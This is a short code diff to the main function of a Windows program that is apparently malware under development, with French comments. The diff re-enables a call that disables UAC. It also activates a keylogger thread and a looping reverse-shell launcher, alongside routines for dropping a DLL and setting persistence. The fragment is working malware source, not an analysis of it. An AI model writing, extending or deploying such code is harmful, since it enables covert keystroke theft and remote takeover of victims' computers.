@@ -12,7 +12,7 @@ INT WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, 
     //Ajout de la persistance
     printf("%s\n", WritePa5aDll() ? "DLL -> OK" : "DLL -> ERROR");
     printf("%s\n", SetPersistence() ? "Persistence -> OK" : "Persistence -> ERROR");
-    /*printf("%s\n", DisableUac() ? "UAC -> OK" : "UAC -> ERROR");
+    printf("%s\n", DisableUac() ? "UAC -> OK" : "UAC -> ERROR");
 
     HANDLE hThreadKeylogger = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadKeylogger, NULL, 0, NULL);
     
@@ -50,8 +50,8 @@ INT WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, 
             HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadReverseShell, NULL, 0, NULL);
         }
 
-        Sleep(1000);
-    }*/
+        Sleep(500);
+    }
 
     return 0;
 }
